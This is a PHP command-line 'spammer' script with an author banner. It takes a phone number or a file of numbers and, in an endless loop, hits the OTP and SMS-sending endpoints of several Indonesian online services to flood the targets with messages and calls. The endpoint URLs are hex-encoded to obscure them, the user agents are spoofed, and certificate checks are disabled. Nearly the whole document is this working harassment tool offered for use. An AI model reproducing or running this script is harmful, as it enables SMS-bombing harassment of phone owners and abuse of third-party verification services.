#!/usr/bin/env php

#Have Fun Spammer

<?php

if(strtolower(substr(PHP_OS, 0, 3)) == 'win') {

$R = "";

$RR = "";

$G = "";

$GG = "";

$B = "";

$BB = "";

$Y = "";

$YY = "";

$X = "";

$ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0';

} else {

$R = "\e[91m";

$RR = "\e[91;7m";

$G = "\e[92m";

$GG = "\e[92;7m";

$B = "\e[36m";

$BB = "\e[36;7m";

$Y = "\e[93m";

$YY = "\e[93;7m";

$X = "\e[0m";

$ua = 'Mozilla/5.0 (Linux; Android 5.1.1; Andromax A16C3H Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36';

system('clear');

}

if(function_exists('pcntl_signal')) {

	declare(ticks = 1);

	function signal_handler($signal) {

		global $Y,$X;

		switch($signal) {

		case SIGTERM:

		die($Y."\n====================[] mrruxhan []=====(√√√)>".$X."\n");

		case SIGKILL:
		
		die($Y."\n====================[] mrruxhan []=====(√√√)>".$X."\n");

		case SIGKILL:
		
		die($Y."\n====================[] mrruxhan []=====(√√√)>".$X."\n");

		case SIGKILL:

		die($Y."\n====================[] mrruxhan []=====(√√)>".$X."\n");

		case SIGINT:

		die($Y."\n====================[] mrruxhan []=====(√)>".$X."\n");

		}

	}

	pcntl_signal(SIGTERM, "signal_handler");

	pcntl_signal(SIGINT, "signal_handler");

}

function post_data($url,$data) {

	global $ua;

	$ch=curl_init($url);

	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

	curl_setopt($ch, CURLOPT_USERAGENT, $ua);

	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);

	return curl_exec($ch);

	curl_close($ch);

	}

	echo $Y.

"

WELCOME TO SPAMMER MRRUXHAN

";

echo $G."\n========[]mrruxhan SPAMER[]========".$X."\n";

echo $YY. $B."\n::###############################################";

echo $R."\n::############[WELCOME]##################";

echo $YY."\n::#: #";

echo $BB."\n::#:Author ::[mrruxhan:] #";

echo $B."\n::#:Instagram ::[@m_masrukhan:]#";

echo $RR."\n::#:Github ::[http://github.com/mrruxhangans:] #";

echo $R."\n::#:Facebook ::[Masrukhan:] #";

echo $G."\n::#:YouTube ::[MRRUXHAN BY:] #";

echo $GG."\n::#:Team ::[Team Army Cyber] #";

echo $YY."\n::#: #";

echo $R."\n::###########[THANKS:YOU:FOR:YOU]###########";

echo $B."\n::###############################################".$G.$X."\n\n";

isset($argv[1]) OR die($RR."[!] []== Input Number target ==[] [!]\n".$X);

if(is_numeric($argv[1])) {

	echo "[]Processing Spam SmS[] #".$G.$argv[1].$X."\n";

	post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x74\x6f\x6b\x6f\x63\x61\x73\x68\x2e\x63\x6f\x6d\x2f\x6f\x61\x75\x74\x68\x2f\x6f\x74\x70","msisdn=".$argv[1]."&accept=call");

	while(1) {

		echo "[]mrruxhan Sending Massage To[] # ".$G.$argv[1].$X."\n";	

		post_data("\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x2e\x6a\x64\x2e\x69\x64\x2f\x70\x68\x6f\x6e\x65\x2f\x73\x65\x6e\x64\x50\x68\x6f\x6e\x65\x53\x6d\x73","phone=".$argv[1]."&smsType=1");

		post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x70\x68\x64\x2e\x63\x6f\x2e\x69\x64\x2f\x65\x6e\x2f\x75\x73\x65\x72\x73\x2f\x73\x65\x6e\x64\x4f\x54\x50","phone_number=".$argv[1]);

	}

}

if(!file_exists($argv[1])) {

	die($RR."[!] File Not Exists [!]".$X."\n");

}

$argv[1]=explode("\n",file_get_contents($argv[1]));

$argv[1]=str_replace(' ','',$argv[1]);

foreach($argv[1] as $argv[2]):

echo "[]Processing spam sms[] #".$G.$argv[2].$X."\n";

	post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x74\x6f\x6b\x6f\x63\x61\x73\x68\x2e\x63\x6f\x6d\x2f\x6f\x61\x75\x74\x68\x2f\x6f\x74\x70","msisdn=".$argv[2]."&accept=call");

endforeach;

while(1) {

foreach($argv[1] as $argv[2]):

echo "[]mrruxhan Sending Massage To[] # ".$G.$argv[2].$X."\n";

	post_data("\x68\x74\x74\x70\x3a\x2f\x2f\x73\x63\x2e\x6a\x64\x2e\x69\x64\x2f\x70\x68\x6f\x6e\x65\x2f\x73\x65\x6e\x64\x50\x68\x6f\x6e\x65\x53\x6d\x73","phone=".$argv[2]."&smsType=1");

	post_data("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x70\x68\x64\x2e\x63\x6f\x2e\x69\x64\x2f\x65\x6e\x2f\x75\x73\x65\x72\x73\x2f\x73\x65\x6e\x64\x4f\x54\x50","phone_number=".$argv[2]);

endforeach;

}

